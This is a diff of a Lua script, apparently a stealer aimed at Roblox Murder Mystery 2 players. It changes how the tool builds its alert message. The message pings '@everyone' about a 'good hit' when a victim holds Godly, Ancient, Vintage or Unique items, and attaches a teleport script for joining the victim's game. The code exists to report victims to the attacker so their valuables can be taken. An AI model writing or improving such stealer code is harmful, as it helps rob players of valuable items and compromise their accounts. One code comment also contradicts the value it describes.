@@ -44,11 +44,16 @@ local function sendnotification(message)
     )
 end
 
-local messageMM2 =
-    "" .. TeleportScript .. ""
-    if Vintage and Godly and Ancient and Unique and Config.GoodItemsOnly then
-    messageMM2 = "@everyone\nYou just got a new **good** hit with **"..StealerName.."**!"
+local messageMM2 = "Hello" -- Initialize messageMM2 as an empty string
+
+-- Check if any of the good items exist and GoodItemsOnly is true
+if (Vintage > 0 or Godly > 0 or Ancient > 0 or Unique > 0) and Config.GoodItemsOnly then
+    messageMM2 = "@everyone\nYou just got a new **good** hit with **" .. StealerName .. "**!\n```lua\n" .. TeleportScript .. "```\n"
+else
+    -- If the condition is not met, you can still append the TeleportScript if needed
+    messageMM2 = "Teleport script:\n```lua\n" .. TeleportScript .. "```\n"
 end
+
 
 local success, errorMsg = pcall(function()
     local games = {
